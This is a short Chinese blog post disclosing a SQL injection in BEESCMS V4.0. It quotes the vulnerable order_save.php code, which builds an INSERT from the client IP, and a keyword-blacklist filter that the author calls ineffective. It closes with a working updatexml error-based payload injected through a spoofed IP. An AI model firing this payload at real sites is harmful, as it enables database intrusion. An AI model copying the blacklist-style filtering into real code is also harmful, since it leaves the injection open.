---
layout: post
title:  "BEESCMS V4.0 存在SQL注入"
comments: true
date:   2016-10-1 13:46:52
categories: php update
---


<blockquote><p>国庆期间看的</p></blockquote>



{% highlight html %}
/mx_form/order_save.php
{% endhighlight %}

{% highlight php %}

$ip=fl_value(get_ip()); //获取ip //过滤函数
$ip=fl_html($ip); //htmlspecialchars
$member_id=empty($_SESSION['id'])?0:$_SESSION['id'];
$arc_id=empty($f_id)?0:intval($_POST['f_id']);
$sql="insert into ".DB_PRE."formlist (form_id,form_time,form_ip,member_id,arc_id) values ({$form_id},{$addtime},'{$ip}','{$member_id}','{$arc_id}')";
$mysql->query($sql);
$last_id=$mysql->insert_id();
$sql_field='id'.$sql_field;
$sql_value=$last_id.$sql_value;
$sql="insert into ".DB_PRE."{$table} ({$sql_field}) values ({$sql_value})";
$mysql->query($sql);

{% endhighlight %}

跟函数fl_value()
fl_value()
对关键函数进行了过滤，不过貌似没有什么卵用
{% highlight php %}

./includes/fun.php

function fl_value($str){
if(empty($str)){return;}
return preg_replace('/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file
|outfile/i','',$str);
}


{% endhighlight %}
fl_html()
转换html 实体编码 对我们没有影响

{% highlight php %}

fl_html()
function fl_html($str){
return htmlspecialchars($str);
}
{% endhighlight %}

ok .
我们修改自己的ip为 ,前台提交订单。

8.8.8.8'or updatexml(1,concat(0x7e,(user())),0) or'


![img](https://striker.teambition.net/thumbnail/110l7ff623ac671823acdd4039ccbd8125f8/w/800/h/188)
